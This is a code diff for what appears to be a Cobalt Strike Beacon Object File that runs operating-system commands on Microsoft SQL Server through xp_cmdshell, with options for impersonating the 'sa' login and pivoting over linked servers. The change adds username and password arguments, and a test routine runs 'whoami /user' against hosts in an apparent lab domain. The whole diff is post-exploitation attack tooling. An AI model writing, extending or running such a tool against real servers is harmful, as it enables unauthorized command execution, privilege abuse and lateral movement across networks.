@@ -4,7 +4,7 @@
 #include "sql_modules.c"
 
 
-void ExecuteXpCmd(char* server, char* database, char* link, char* impersonate, char* command)
+void ExecuteXpCmd(char* server, char* user, char* password, char* database, char* link, char* impersonate, char* command)
 {
     SQLHENV env			 = NULL;
     SQLHSTMT stmt 		 = NULL;
@@ -17,11 +17,11 @@ void ExecuteXpCmd(char* server, char* database, char* link, char* impersonate, c
 
     if (link == NULL)
 	{
-		dbc = ConnectToSqlServer(&env, server, database);
+		dbc = ConnectToSqlServer(&env, server, user, password, database);
 	}
 	else
 	{
-		dbc = ConnectToSqlServer(&env, server, NULL);
+		dbc = ConnectToSqlServer(&env, server, user, password, NULL);
 	}
 
     if (dbc == NULL) {
@@ -160,6 +160,8 @@ VOID go(
 ) 
 {
 	char* server;
+	char* user;
+	char* password;
 	char* database;
 	char* link;
 	char* impersonate;
@@ -172,12 +174,16 @@ VOID go(
 	BeaconDataParse(&parser, Buffer, Length);
 	
 	server	 	= BeaconDataExtract(&parser, NULL);
+	user	 	= BeaconDataExtract(&parser, NULL);
+	password 	= BeaconDataExtract(&parser, NULL);
 	database 	= BeaconDataExtract(&parser, NULL);
 	link 		= BeaconDataExtract(&parser, NULL);
 	impersonate = BeaconDataExtract(&parser, NULL);
 	command 	= BeaconDataExtract(&parser, NULL);
 
 	server = *server == 0 ? "localhost" : server;
+	user = *user == 0 ? NULL : user;
+	password = *password == 0 ? NULL : password;
 	database = *database == 0 ? "master" : database;
 	link = *link  == 0 ? NULL : link;
 	impersonate = *impersonate == 0 ?  NULL : impersonate;
@@ -192,7 +198,7 @@ VOID go(
 		return;
 	}
 	
-	ExecuteXpCmd(server, database, link, impersonate, command);
+	ExecuteXpCmd(server, user, password, database, link, impersonate, command);
 
 	printoutput(TRUE);
 };
@@ -202,13 +208,13 @@ VOID go(
 int main()
 {
 	internal_printf("============ BASE TEST ============\n\n");
-	ExecuteXpCmd("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "whoami /user");
+	ExecuteXpCmd("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, NULL, "whoami /user");
 
 	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
-	ExecuteXpCmd("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "whoami /user");
+	ExecuteXpCmd("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, "sa", "whoami /user");
 
 	internal_printf("\n\n============ LINK TEST ============\n\n");
-	ExecuteXpCmd("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "whoami /user");
+	ExecuteXpCmd("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", "BRAAVOS", NULL, "whoami /user");
 }
 
 #endif
